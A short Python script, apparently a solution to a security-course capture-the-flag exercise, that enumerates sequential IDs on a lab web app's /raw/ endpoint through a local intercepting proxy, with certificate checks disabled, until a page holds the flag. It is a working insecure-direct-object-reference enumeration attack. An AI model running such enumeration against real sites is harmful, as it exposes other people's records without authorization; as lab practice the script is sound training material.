import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Setup
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
s = requests.session()
s.verify = False
s.proxies = {"https": "http://127.0.0.1:8080"}

# The regex pattern to find the flag
flag_pattern = re.compile(r"COMP6443\{.*\}")

print("*Starting*")
recent_req = 127
# Iterate through the IDs
for i in range(1, recent_req):
    url = f'https://support-v0.quoccacorp.com/raw/{i}/'
    
    try:
        response = s.get(url, timeout=5)
        
        # Check if the flag is in the text of the page
        match = flag_pattern.search(response.text)
        
        if match:
            print(f"\n[+] Flag found at ID {i}!")
            print(f"URL: {url}")
            print(f"Flag: {match.group(0)}")
            break # Stop once we find it
                
    except requests.exceptions.RequestException as e:
        print(f"Error at ID {i}: {e}")